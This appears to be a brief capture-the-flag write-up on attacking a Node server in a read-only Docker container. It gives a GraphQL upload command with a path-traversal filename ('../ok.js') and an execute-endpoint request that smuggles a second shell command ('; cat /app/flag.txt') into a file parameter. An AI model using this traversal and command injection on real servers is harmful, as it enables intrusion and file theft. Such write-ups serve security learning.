The docker was running with read only . Except the folder where server.js was there ( write access also there ) . This is where the server was Broken. 
You couldn't upload the file ( even through graphql) . Graphql did create file but will stuck on writing data to it .

The server.js was running using the rruser 

Upload through graphql  

curl -X POST http://localhost:7000/graphql \
  -F operations='{
    "query": "mutation ($file: Upload!, $filename: String!) { uploadFile(file: $file, filename: $filename) { filename, path } }", 
    "variables": {
      "file": null, 
      "filename": "../ok.js"
    }
  }' \
  -F map='{"0": ["variables.file"]}' \
  -F 0=@text.js 

(cancel the upload . as it will be stuck ) 

Now run 

curl "http://20.193.159.130:7000/execute?file=../ok4.js%20%3B%20cat%20/app/flag.txt"
The existence of flag.txt can be confirmed using the ls command instead of cat .



